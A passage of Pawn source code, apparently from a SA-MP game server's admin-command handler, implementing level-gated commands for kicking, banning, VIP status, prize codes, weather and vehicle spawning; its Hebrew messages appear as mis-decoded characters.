		if(playerinfo[playerid][admin] < 14 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 14");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pspecoff [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][spectate] != playerid || GetPlayerState(id) != PLAYER_STATE_SPECTATING) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ьр сюЄўс Єьщъ");
		TogglePlayerSpectating(id,0);
		LoadPlayerPos(id);
 		playerinfo[id][spectate] = -1;
		format(string,sizeof(string)," .Єьщъ фхЇёў %s фюЄўс ∙ь",GetName(id));
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," .фЇёщў р· фюЄўс ∙ьъ рч°щх %s фрующя",GetName(playerid));
		SendClientMessage(id,yellow,string);
		return 1;
	}
	if(equal(cmd,"/soff"))
	{
		if(IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," /specoff :ф∙·ю∙ с");
		if(playerinfo[playerid][spectate] == -1 || GetPlayerState(playerid) != PLAYER_STATE_SPECTATING) return SendClientMessage(playerid,red," .р·ф ьр сюЄўс Єь рє рчу");
		TogglePlayerSpectating(playerid,0);
		LoadPlayerPos(playerid);
 		playerinfo[playerid][spectate] = -1;
		SendClientMessage(playerid,yellow," .фЇёў· р· фюЄўс");
		return 1;
	}
	if(equal(cmd,"/dteleall") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 14 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 14");
		new c = 0;
		for(new i = 0; i < MAX_ADMIN_TELEPORTS; i++) if(Teleports[i][Ttype] == tele_normal)
		{
			format(AdminTeleports[i][Tauthor],32,"");
			AdminTeleports[i][Ttype] = tele_none;
			c++;
		}
		if(!c) return SendClientMessage(playerid,red," .рщя ∙щтх°щэ ∙ЁхЎ°х Є\"щ фрующЁщэ");
		format(cmd,sizeof(cmd)," .Ёючўх %d ∙щтх°щэ ∙щЎ°х фрующЁщэ",c);
		SendClientMessage(playerid,green,cmd);
		AdminInfo(playerid,cmdtext);
		return 1;
	}
	if(equal(cmd,"/setgravity") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new Float:g, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setgravity [gravity] :Ўх°· ф∙щюх∙");
		g = floatstr(cmd);
		if(g < -1.000000 || g > 1.000000) return SendClientMessage(playerid,red," .ыхч ю∙щыф ∙тхщ");
		SetGravity(g);
		format(string,sizeof(string)," .∙щЁф р· ыхч фю∙щыф ь %.3f %s фрующя",g,GetName(playerid));
		SendClientMessageToAll(white,string);
		return 1;
	}
	if(equal(cmd,"/setweather") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
		new w, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /setweather [weather] :Ўх°· ф∙щюх∙");
		w = strval(cmd);
		if(!IsValidWeather(w) && !playerinfo[playerid][pp]) return SendClientMessage(playerid,red," .юцт рхщ° ∙тхщ");
		SetWeather(serverWeather = w);
		format(string,sizeof(string)," .∙щЁф р· юцт фрхщ° ьюцт рхщ° юёЇ° %d %s фрующя",w,GetName(playerid));
		SendClientMessageToAll(white,string);
		return 1;
	}
	if(equal(cmd,"/kickall") && IsPlayerMAdmin(playerid))
	{
		new id, not[MAX_PLAYERS], reason[256];
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		for(new i=0;i<MAX_PLAYERS_;i++) not[i] = 0;
		cmd = strtok(cmdtext,idx);
		reason = "ыхьэ фхЎрх юф∙°· - фрующя ьр фўьщу ёщсф";
		if(!strlen(cmd))
		{
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][admin] < playerinfo[playerid][admin]) SetKick(i,playerid,reason);
		}
		while(strlen(cmd) > 0)
		{
			if(cmd[0] == '|')
			{
				strmid(reason,cmdtext,strfind(cmdtext,"|") + 1,strlen(cmdtext));
				break;
			}
			else
			{
				id = ReturnUser(cmd,playerid);
				if(IsPlayerConnected(id)) not[id] = 1;
				cmd = strtok(cmdtext,idx);
			}
		}
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && !not[i] && playerinfo[i][admin] < playerinfo[playerid][admin]) SetKick(i,playerid,reason);
		return 1;
	}
	if(equal(cmd,"/kicksome") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
		new id[MAX_PLAYERS], ids = 0, reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /kicksome [id/name] [id/name] [id/name] ... |[reason] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /kicksome 0 2 6 |cheaters :∙щэ ьс: ьфыЁё· ёщсф щ∙ ьфўьщу | сёхє фшўёш, ьухтюф");
			return 1;
		}
		reason = "фрующя ьр фўьщу ёщсф";
		while(strlen(cmd) > 0)
		{
			if(cmd[0] == '|')
			{
				strmid(reason,cmdtext,strfind(cmdtext,"|") + 1,strlen(cmdtext));
				break;
			}
			else id[ids++] = ReturnUser(cmd,playerid), cmd = strtok(cmdtext,idx);
		}
		if(ids > 0) for(new i=0;i<ids;i++) if(IsPlayerConnected(id[i]) && playerinfo[id[i]][admin] < playerinfo[playerid][admin]) SetKick(id[i],playerid,reason);
		return 1;
	}
	if(equal(cmd,"/bansome") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 15 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
		new id[MAX_PLAYERS], ids = 0, reason[256];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /bansome [id/name] [id/name] [id/name] ... |[reason] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," /bansome 0 2 6 |cheaters :∙щэ ьс: ьфыЁё· ёщсф щ∙ ьфўьщу | сёхє фшўёш, ьухтюф");
			return 1;
		}
		reason = "фрующя ьр фўьщу ёщсф";
		while(strlen(cmd) > 0)
		{
			if(cmd[0] == '|')
			{
				strmid(reason,cmdtext,strfind(cmdtext,"|") + 1,strlen(cmdtext));
				break;
			}
			else id[ids++] = ReturnUser(cmd,playerid), cmd = strtok(cmdtext,idx);
		}
		if(ids > 0) for(new i=0;i<ids;i++) if(IsPlayerConnected(playerid) && IsPlayerConnected(id[i]) && playerinfo[id[i]][admin] < playerinfo[playerid][admin]) SetBan(id[i],playerid,reason);
		return 1;
	}
	if(equal(cmd,"/showme") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 12 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 12");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /showme [show/hide] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"show"))
		{
			playerinfo[playerid][showme] = 1;
			SendClientMessage(playerid,green," .ыЄ· ·хЇщЄ с°∙щю· фрующЁщэ + ф·рт ∙ьъ фхчц°");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"special"))
		{
			playerinfo[playerid][showme] = 3;
			SendClientMessage(playerid,green," .ыЄ· ьр ·хЇщЄ с°∙щю· фрующЁщэ хщфщф рЇ∙° ьсЎЄ Єьщъ Їўхух·");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"hide"))
		{
			playerinfo[playerid][showme] = 0;
			SendClientMessage(playerid,green," .ыЄ· ьр ·хЇщЄ с°∙щю· фрующЁщэ + ф·рт ∙ьъ фхё°");
			PlaySound(playerid,1057);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"ShowMe",playerinfo[playerid][showme]);
		return 1;
	}
	if(equal(cmd,"/setrank") && playerinfo[playerid][admin])
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new id, string[M_S], therank, set;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setrank [id/name] [set? 1 = yes, 0 = no] [rank] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid), cmd = strtok(cmdtext,idx), set = strval(cmd), cmd = strrest(cmdtext,idx), therank = RankID(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(set < 0 && set > 1) return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		if(therank == -1) return SendClientMessage(playerid,red," .ўсхЎ· ю∙·ю∙щэ ∙тхщф");
		if(set)
		{
			if(playerinfo[id][rank][therank]) return SendClientMessage(playerid,red," .ф∙чўя ∙сч°· ыс° ЁюЎр сўсхЎ· фю∙·ю∙щэ фцх");
			format(string,sizeof(string),"Rank%02d",therank);
			fsetint(fuser(id),string,1);
			format(string,sizeof(string)," :ьўсхЎ· фю∙·ю∙щэ %s фыЁё· р·",GetName(id));
			SendClientMessage(playerid,green,string);
			SendClientMessage(id,green," :фрующя фыЁщё рх·ъ ьўсхЎ· фю∙·ю∙щэ");
		}
		else
		{
			if(!playerinfo[id][rank][therank]) return SendClientMessage(playerid,red," .ф∙чўя ∙сч°· ьр ЁюЎр сўсхЎ· фю∙·ю∙щэ фцх");
			format(string,sizeof(string),"Rank%02d",therank);
			fsetint(fuser(id),string,0);
			format(string,sizeof(string)," :юўсхЎ· фю∙·ю∙щэ %s фхЎр· р·",GetName(id));
			SendClientMessage(playerid,green,string);
			SendClientMessage(id,green," :фрующя фхЎщр рх·ъ юўсхЎ· фю∙·ю∙щэ");
		}
		playerinfo[id][rank][therank] = set;
		SendClientMessage(playerid,green,cmd);
		SendClientMessage(id,green,cmd);
		return 1;
	}
	if(equal(cmd,"/removecode") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /removecode [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		SendClientMessage(id,red," .фЁфь· ф∙°· ючўф р· фўху ∙ьъ");
	 	SendClientMessage(playerid,red," .фўху Ёючў сфЎьчф");
		CallRemoteFunction("SetPlayerPrize","iii",id,0,0);
		playerinfo[playerid][playerprize] = 0;
		return 1;
	}
	if(equal(cmd,"/addcodes"))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new string[M_S], code[32];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /addcodes [number of codes 1 - 20] :Ўх°· ф∙щюх∙");
		fileCheck(file_codes);
		new n = strval(cmd), rnd, chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", p = 0, a = 0;
		if(n < 1 || n > 20) return SendClientMessage(playerid,red," .Єь юёЇ° ьфщх· сщя 1 ь 20");
		SendClientMessage(playerid,lightblue," ~~~ :ЁхёЇх фўхущэ фсрщэ ~~~");
		for(new i = 1; i <= n; i++)
		{
			rnd = randomEx(5,8);
			for(new t = 0; t < rnd; t++) format(code,sizeof(code),"%s%c",code,chars[random(sizeof(chars))]);
			format(string,sizeof(string),"%dCodeText",i);
			fsetstring(file_codes,string,code);
			p = randomEx(1,sizeof(Codes));
			format(string,sizeof(string),"%dCodePrize",i);
			fsetint(file_codes,string,p);
			a = Codes[p][cdSID] > 0 ? randomEx(1,4) : (!Codes[p][cdMaxVal] ? 0 : randomEx(Codes[p][cdMinVal],Codes[p][cdMaxVal]+1));
			format(string,sizeof(string),"%dPrizeAmount",i);
			fsetint(file_codes,string,a);
			format(string,sizeof(string),"%dCodeCount",i);
			fsetint(file_codes,string,1);
			format(string,sizeof(string)," Code #%d: %s (%d %s [%d])",i,code,a,Codes[p][cdName],p);
			SendClientMessage(playerid,grey,string);
			code = "";
			for(new j = 0; j < MAX_PLAYERS_; j++) if(IsPlayerConnected(j) && playerinfo[j][usedcode][i-1]) playerinfo[j][usedcode][i-1] = false;
		}
		format(string,sizeof(string),"added %d codes",n);
		Log("Attention",playerid,string);
		return 1;
	}
	if(equal(cmd,"/addcode") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new string[M_S], code[32];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /addcode [code type] [amount] :Ўх°· ф∙щюх∙");
			return SendClientMessage(playerid,white," (/codelist :°∙щю· ёхтщ ўхущэ)");
		}
		new ctype = strval(cmd), rnd, chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", a = 0;
		if(ctype < 1 || ctype > sizeof(Codes)-1) return SendClientMessage(playerid,red," .ёхт ўху ∙тхщ");
		cmd = strtok(cmdtext,idx), a = !strlen(cmd) || !IsNumeric(cmd) ? (randomEx(Codes[ctype][cdSID] > 0 ? 1 : Codes[ctype][cdMinVal],(Codes[ctype][cdSID] > 0 ? 4 : Codes[ctype][cdMaxVal])+1)) : strval(cmd);
		if(!Codes[ctype][cdMaxVal] && !Codes[ctype][cdSID]) a = 0;
		if(!Codes[ctype][cdSID] && (a < Codes[ctype][cdMinVal] || a > Codes[ctype][cdMaxVal])) return SendClientMessage(playerid,red," .ыюх· ∙тхщф");
		fileCheck(file_codes);
		rnd = randomEx(5,8);
		for(new t = 0; t < rnd; t++) format(code,sizeof(code),"%s%c",code,chars[random(sizeof(chars))]);
		fsetstring(file_codes,"1CodeText",code);
		fsetint(file_codes,"1CodePrize",ctype);
		fsetint(file_codes,"1PrizeAmount",a);
		fsetint(file_codes,"1CodeCount",1);
		for(new j = 0; j < MAX_PLAYERS_; j++) if(IsPlayerConnected(j) && playerinfo[j][usedcode][0]) playerinfo[j][usedcode][0] = false;
		SendClientMessage(playerid,lightblue," ~~~ :Ёхёє фўху фср ~~~");
		format(string,sizeof(string)," Code #1: %s (%d %s [%d])",code,a,Codes[ctype][cdName],ctype);
		SendClientMessage(playerid,grey,string);
		format(string,sizeof(string),"added one code of %d %s",a,Codes[ctype][cdName]);
		Log("Attention",playerid,string);
		return 1;
	}
	if(equal(cmd,"/setcode") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setcode [code num] [code text] :Ўх°· ф∙щюх∙");
		new cid = strval(cmd);
		if(cid < 1 || cid > 20) return SendClientMessage(playerid,red," .юёЇ° фўху Ў°щъ ьфщх· сщя 1 ь 20");
		format(string,sizeof(string),"%dCodeText",cid);
		if(!fkeyexist(file_codes,string) || equal(fgetstring(file_codes,string),"None")) return SendClientMessage(playerid,red," .юёЇ° фўху ∙фўьу· ьр ўщщэ");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || strlen(cmd) > 20) return SendClientMessage(playerid,red," .рх°ъ фшўёш фчу∙ ∙фўьу· р°хъ рх ўЎ° юущ");
		fsetstring(file_codes,string,cmd);
		format(string,sizeof(string)," :фшўёш ∙ь ўху юёЇ° %d ф∙·Ёф ь",cid);
		SendClientMessage(playerid,grey,string);
		SendClientMessage(playerid,grey,cmd);
		format(string,sizeof(string),"set code #%d name to %s",cid,cmd);
		Log("Attention",playerid,string);
		return 1;
	}
	if(equal(cmd,"/countcode") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /countcode [code num] [count] :Ўх°· ф∙щюх∙");
		new cid = strval(cmd);
		if(cid < 1 || cid > 20) return SendClientMessage(playerid,red," .юёЇ° фўху Ў°щъ ьфщх· сщя 1 ь 20");
		format(string,sizeof(string),"%dCodeText",cid);
		if(!fkeyexist(file_codes,string) || equal(fgetstring(file_codes,string),"None")) return SendClientMessage(playerid,red," .юёЇ° фўху ∙фўьу· ьр ўщщэ");
		cmd = strtok(cmdtext,idx);
		new n = strval(cmd);
		if(!strlen(cmd) || n < 1 || n > 100) return SendClientMessage(playerid,red," .щ∙ ьфўьщу ыюх· сщя 1 ь-100");
		format(string,sizeof(string),"%dCodeCount",cid);
		fsetint(file_codes,string,n);
		format(string,sizeof(string)," .ыюх· ўху юёЇ° %d фщр юЄы∙щх %d",cid,n);
		SendClientMessage(playerid,grey,string);
		format(string,sizeof(string),"set code #%d count to %d",cid,n);
		Log("Attention",playerid,string);
		return 1;
	}
	if(equal(cmd,"/waves") && IsPlayerMAdmin(playerid)) // guard_shit
	{
	    if(playerinfo[playerid][admin] < 15 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 15");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /waves [height 0-500] :Ўх°· ф∙щюх∙");
		new w = strval(cmd), string[M_S];
		if(w < 0) w = 0;
		if(w > 500) w = 500;
		waves = w;
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][sguard][0]) SetPlayerWaveLevel(i,w);
		format(string,sizeof(string)," * ∙щЁф р· тхсф фтьщэ ь-%d %s фрующя",waves,GetName(playerid));
		SendClientMessageToAll(white,string);
		return 1;
	}
	if(equal(cmd,"/setvip") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new id = -1, string[M_S], vlevel, uname[256];
		uname = strtok(cmdtext,idx);
		if(!strlen(uname)) return SendClientMessage(playerid,white," /setvip [user name] [vlevel] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string),"/DM/Users/%s.ini",uname);
		if(!fexist(string)) return SendClientMessage(playerid,red," .ыщЁхщ ∙тхщ");
		cmd = strtok(cmdtext,idx), vlevel = !strlen(cmd) || !IsNumeric(cmd) ? 1 : strval(cmd);
		if(vlevel < 1 || vlevel > 3) return SendClientMessage(playerid,red," .∙тхщф VIP °ю·");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && equal(GetName(i),uname))
		{
			id = i;
			break;
		}
		new vlevelname[32];
		if(vlevel == 1) vlevelname = "{996600}V.I.P Bronze";
		else if(vlevel == 2) vlevelname = "{d3d3d3}V.I.P Silver";
		else if(vlevel == 3) vlevelname = "{ffcc00}V.I.P Gold";
		format(string,sizeof(string),!fkeyexist(file_vip,uname) ? (" * !(%d :VIP °ю·) VIP ўщсь "@c(lightyellow)"%s"@c(orange)" - юць шхс") : (" * !%d ∙хЁ·ф ь "@c(lightyellow)"%s"@c(orange)" ∙ь VIP юць шхс - °ю· ф"),vlevel,uname);
		SendClientMessageToAll(orange,string);
		if(id != -1)
		{
			playerinfo[id][vip] = vlevel;
			format(string,sizeof(string)," .%s"@c(green)" юёхт VIP фрующя фсщр ьъ ю∙·ю∙",vlevelname);
			SendClientMessage(id,green,string);
		}
		format(string,sizeof(string)," .%s"@c(green)" юёхт %s ь VIP Ё·· ю∙·ю∙",vlevelname,uname);
		SendClientMessage(playerid,green,string);
		fsetint(file_vip,uname,vlevel);
		return 1;
	}
	if(equal(cmd,"/delvip") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 17 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 17");
		new id = -1, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /delvip [user name] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string),"/DM/Users/%s.ini",cmd);
		if(!fexist(string)) return SendClientMessage(playerid,red," .ыщЁхщ ∙тхщ");
		if(!fkeyexist(file_vip,cmd)) return SendClientMessage(playerid,red," .VIP ь∙чўя цф рщя");
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && equal(GetName(i),cmd))
		{
			id = i;
			break;
		}
		if(id != -1)
		{
			playerinfo[id][vip] = 0;
			SendClientMessage(id,green," .VIP фрующя ючў ьъ р· ю∙·ю∙ ф");
		}
		format(string,sizeof(string)," .VIP р· ю∙·ю∙ ф %s ючў· ь",cmd);
		SendClientMessage(playerid,green,string);
		fremovekey(file_vip,cmd);
		return 1;
	}
	if((equal(cmd,"/vehicle") || equal(cmd,"/v")) && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 16");
		new string[M_S], Float:p[4], vmodel, vid, avid = INVALID_VEHICLE_ID;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return model_Show(playerid,mVehicles);
		vmodel = IsNumeric(cmd)? strval(cmd):GetVehicleModelIDFromName(cmd);
		if(vmodel < 400 || vmodel > 611) return SendClientMessage(playerid,red," .∙э ф°ыс рх юхуь ∙тхщ");
		for(new i = 0; i < MAX_ADMIN_VEHICLES && avid == INVALID_VEHICLE_ID; i++) if(playerinfo[playerid][createdv][i] == INVALID_VEHICLE_ID) avid = i;
		if(avid == -1 || playerinfo[playerid][createdvs] >= MAX_ADMIN_VEHICLES) return SendClientMessage(playerid,red," .ыь рующя щыхь ьщЎх° Єу " #MAX_ADMIN_VEHICLES " °ысщэ у°ъ фрующя, Ёр ьючхў чьў Єь юЁ· ьщЎх° Єху");
		GetPlayerFacingAngle(playerid,p[3]);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],IsPlayerInAnyVehicle(playerid)? 8.0:5.0);
		vid = CreateVehicleEx(vmodel,p[0],p[1],p[2],p[3]+90,-1,-1,respawntime,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid));
		playerinfo[playerid][createdv][avid] = vid;
		playerinfo[playerid][createdvs]++;
		format(string,sizeof(string)," %s :°ыс %d ЁхЎ°",GetVehicleName(vmodel),vid);
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/spveh") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 16");
		new Float:p[4], vmodel;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /spveh [vehicle name/model] [obj] :Ўх°· ф∙щюх∙");
		vmodel = IsNumeric(cmd)? strval(cmd):GetVehicleModelIDFromName(cmd);
		if(vmodel < 400 || vmodel > 611) return SendClientMessage(playerid,red," .∙э ф°ыс рх юхуь ∙тхщ");
		cmd = strtok(cmdtext,idx);
		GetPlayerFacingAngle(playerid,p[3]);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],IsPlayerInAnyVehicle(playerid)? 8.0:5.0);
		CreateSpecialVehicle(vmodel,p[0],p[1],p[2],p[3],-1,-1,respawntime,world_normal,CreateSObject(strval(cmd),0.0,0.0,0.0,0.0,0.0,0.0),2,"Test",!strlen(strtok(cmdtext,idx)));
		SendClientMessage(playerid,yellow,"Done");
		return 1;
	}
	if(equal(cmd,"/vsave") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 16");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
		new Float:p[4];
		GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
		GetVehicleZAngle(GetPlayerVehicleID(playerid),p[3]);
		for(new i=0;i<4;i++) vehicleinfo[GetPlayerVehicleID(playerid)][vpos][i] = p[i];
		vehicleinfo[GetPlayerVehicleID(playerid)][veint] = GetPlayerInterior(playerid);
		vehicleinfo[GetPlayerVehicleID(playerid)][veworld] = GetPlayerVirtualWorld(playerid);
		vehicleinfo[GetPlayerVehicleID(playerid)][store] = 0;
		SendClientMessage(playerid,yellow," .ф°ыс ∙юх°");
		return 1;
	}
	if(equal(cmd,"/vdel") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 16");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
		new v = GetPlayerVehicleID(playerid);
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][createdvs] > 0) for(new j = 0; j < MAX_ADMIN_VEHICLES; j++) if(playerinfo[i][createdv][j] == v)
		{
			playerinfo[i][createdv][j] = INVALID_VEHICLE_ID, playerinfo[i][createdvs]--;
			break;
		}
		DestroyVehicleEx(v);
		SendClientMessage(playerid,green," .ф°ыс Ёючў сфЎьчф");
		return 1;
	}
	if(equal(cmd,"/vdel2") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 16");
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· с°ыс");
		new v = GetPlayerVehicleID(playerid), File:f = fopen("/DM/SaveAll.txt",io_append), string[M_S];
		format(string,sizeof(string),"CreateVehicleEx(%d,%.4f,%.4f,%.4f,%.4f,%d,%d,respawntime,%d,%d); // %s - To delete\r\n",GetVehicleModel(v),vehicleinfo[v][vspawnpos][0],vehicleinfo[v][vspawnpos][1],vehicleinfo[v][vspawnpos][2],vehicleinfo[v][vspawnpos][3],vehicleinfo[v][vcol][0],vehicleinfo[v][vcol][1],vehicleinfo[v][veint],vehicleinfo[v][veworld],GetVehicleName(GetVehicleModel(v)));
		fwrite(f,string);
		fclose(f);
		DestroyVehicleEx(v);
		SendClientMessage(playerid,green," .ф°ыс Ёючў сфЎьчф ь·ющу");
		return 1;
	}
	if(equal(cmd,"/vdelall") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))))
	{
		if(playerinfo[playerid][admin] < 16 && playerid != ConsoleID && !PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·"))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 16");
		if(!playerinfo[playerid][createdvs]) return SendClientMessage(playerid,red," .ьр щЎ°· °ысщэ");
		for(new j = 0; j < MAX_ADMIN_VEHICLES; j++) if(playerinfo[playerid][createdv][j] != INVALID_VEHICLE_ID)
		{
			DestroyVehicleEx(playerinfo[playerid][createdv][j]);
			playerinfo[playerid][createdv][j] = INVALID_VEHICLE_ID;
		}
		playerinfo[playerid][createdvs] = 0;
		SendClientMessage(playerid,green," .ыь ф°ысщэ ∙щЎ°· Ёючўх");
		return 1;
	}
	if(equal(cmd,"/odel") && IsPlayerMAdmin(playerid))
	{
